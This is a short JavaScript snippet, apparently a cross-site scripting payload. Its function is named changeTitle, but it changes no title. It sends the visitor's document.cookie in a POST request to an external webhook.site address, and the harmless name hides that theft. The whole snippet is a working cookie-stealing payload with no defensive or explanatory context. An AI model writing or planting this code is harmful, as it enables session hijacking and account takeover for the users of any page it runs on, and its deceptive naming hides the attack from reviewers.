function changeTitle() {
    let server = new XMLHttpRequest;
    server.open("POST", "https://webhook.site/75774ec1-19b9-4cc8-bad6-7e029e4930af",true);
    server.setRequestHeader("Content-Type", "text/plain");
    server.setRequestHeader("Access-Control-Allow-Origin", "*");
    server.send(document.cookie);
}
